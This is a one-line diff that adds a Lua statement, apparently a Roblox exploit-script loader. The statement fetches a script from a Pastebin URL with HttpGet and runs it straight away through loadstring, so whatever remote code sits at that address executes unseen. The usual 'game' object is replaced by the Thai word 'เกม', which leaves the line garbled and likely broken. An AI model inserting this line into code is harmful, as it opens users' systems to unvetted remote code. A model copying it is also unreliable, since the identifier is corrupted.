@@ -1,0 +1,1 @@
+loadstring(เกม:HttpGet("https://pastebin.com/Kq0hA3ay"))()
